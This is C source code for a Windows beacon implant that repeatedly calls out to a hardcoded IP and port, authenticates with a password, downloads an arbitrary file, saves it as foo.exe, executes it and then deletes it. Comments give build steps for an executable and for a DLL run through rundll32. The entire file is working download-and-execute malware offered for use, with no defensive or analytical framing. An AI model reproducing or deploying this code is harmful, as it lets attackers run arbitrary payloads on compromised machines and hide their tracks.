#include <stdio.h>
#include <winsock2.h>
#include <stdint.h>
#include <windows.h>


// server attempts to connect to client on regular basis until client opens port 
//1: client -> server :: password
//2: client -> server :: filesize in bytes
//3: client -> server :: file
//4: server writes file to disk
//5: server executes file 

#pragma comment(lib,"ws2_32.lib") //Winsock Library
// WINDOWS GCC COMPILE
//gcc winbeacon.c -o prog -lws2_32

// MINGW COMPILE
//x86_64-w64-mingw32-gcc winbeacon.c -o prog.exe -lws2_32

// DEBUG COMPILE
//gcc winbeacon.c -o prog -lws2_32 -g

// DLL COMPILE
//gcc -c winbeacon.c
//gcc -shared -o maindll.dll main.o -lws2_32

// DLL EXECUTE 
//rundll32.exe maindll.dll,main


#define EXECUTABLE_NAME "foo.exe"
#define PASSWORD "password"
#define DESTINATION_IP "192.168.217.219"
#define DESTINATION_PORT 8080
#define NUM_SECONDS_BETWEEN_CALLBACKS 15

//BOOL APIENTRY DllMain( HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
//{
//   switch ( ul_reason_for_call )
//   {
//      case DLL_PROCESS_ATTACHED:
//      // A process is loading the DLL.
//      break;
//      
//      case DLL_THREAD_ATTACHED:
//      // A process is creating a new thread.
//      break;
//      
//      case DLL_THREAD_DETACH:
//      // A thread exits normally.
//      break;
//      
//      case DLL_PROCESS_DETACH:
//      // A process unloads the DLL.
//     break;
//   }
//   return TRUE;
//}


DWORD WINAPI ThreadFuncRunExe(void* data) {
  system(EXECUTABLE_NAME);
  DeleteFile(EXECUTABLE_NAME);
  return 0;
}


DWORD WINAPI ThreadFunc(void* data) {
  // Do stuff.  This will be the first function called on the new thread.
  // When this function returns, the thread goes away.  See MSDN for more details.
  	FILE *fp;
	int status;
	char path[PATH_MAX];
	size_t PASSWORD_LEN = strlen(PASSWORD);
    WSADATA wsa;
    SOCKET s;
	struct sockaddr_in server;
    char *message , server_reply[PASSWORD_LEN + 1];
    int recv_size;
	char *buffer;
	
	uint32_t network_file_size;
	uint32_t file_size;
	
	
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 1;
    }
     
    printf("Initialised.\n");
     
    
		

	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d" , WSAGetLastError());
	}
 
	printf("Socket created.\n");
	
	server.sin_addr.s_addr = inet_addr(DESTINATION_IP);
	server.sin_family = AF_INET;
	server.sin_port = htons( DESTINATION_PORT );
 
	
	//Connect to remote server
	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		puts("connect error");
		goto close_socket;
		//return 1;
	}
	 
	puts("Connected");
 
	//Send some data
	message = "GET / HTTP/1.1\r\n\r\n";
	if( send(s , message , strlen(message) , 0) < 0)
	{
		puts("Send failed");
		goto close_socket;
		//return 1;
	}
	puts("Data Send\n");
	
	//Receive a reply from the server
	if((recv_size = recv(s , server_reply , PASSWORD_LEN , 0)) == SOCKET_ERROR)
	{
		puts("recv failed");
		goto close_socket;
	}
	 
	puts("Reply received\n");
 
	//Add a NULL terminating character to make it a proper string before printing
	server_reply[PASSWORD_LEN] = '\0';
	
	puts(server_reply);
	
	if (strcmp(server_reply, PASSWORD) != 0 ) {
		puts("incorrect password");
		goto close_socket;
		//return 1;
	}
	
	puts("correct password");
	message = "ACK";
	if( send(s , message , strlen(message) , 0) < 0)
	{
		puts("Send failed");
		goto close_socket;
		//return 1;
	}
	puts("Data Send\n");
	
	buffer = malloc(sizeof(network_file_size));
	
	recv_size = 0;
	while (recv_size != sizeof(network_file_size)) {
		recv_size += recv(s, buffer+recv_size, sizeof(network_file_size), 0);
		printf("bytes recieved: %i\n", recv_size);
	}
	
	memcpy(&network_file_size, buffer, sizeof(network_file_size));
	file_size= ntohl(network_file_size);
	
	free(buffer);

	printf("Data received: File size is %u bytes\n",file_size);
	
	buffer = malloc(file_size);
	
	recv_size = 0;
	while (recv_size != file_size){
		recv_size += recv(s, buffer+recv_size, sizeof(file_size), 0);
		//printf("bytes recieved: %i\n", recv_size);
	}	
	printf("bytes recieved: %i\n", recv_size);
	
	puts("Got File\n");
	
	// Open File for writing
	FILE *f_dst = fopen(EXECUTABLE_NAME, "wb");
	if(f_dst == NULL)
	{
		printf("ERROR - Failed to open file for writing\n");
		//exit(1);
	}

	// Write Buffer
	if(fwrite(buffer, 1, file_size, f_dst) != file_size)
	{
		printf("ERROR - Failed to write %i bytes to file\n", file_size);
		//exit(1);
	}

	// Close File
	fclose(f_dst);
	f_dst = NULL;

	puts("Wrote file \n");
	free(buffer);
	
	HANDLE thread = CreateThread(NULL, 0, ThreadFuncRunExe, NULL, 0, NULL);
	if (thread) {
		// Optionally do stuff, such as wait on the thread.
	}
	close_socket:
	if (closesocket(s) == SOCKET_ERROR) {
		puts("closesocket failed");
	}
	return 0;
}

int main(int argc , char *argv[])
{						
	while (1) {
		
		HANDLE thread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
		if (thread) {
			// Optionally do stuff, such as wait on the thread.
		}
		
		Sleep(NUM_SECONDS_BETWEEN_CALLBACKS * 1000);
	}
    return 0;
}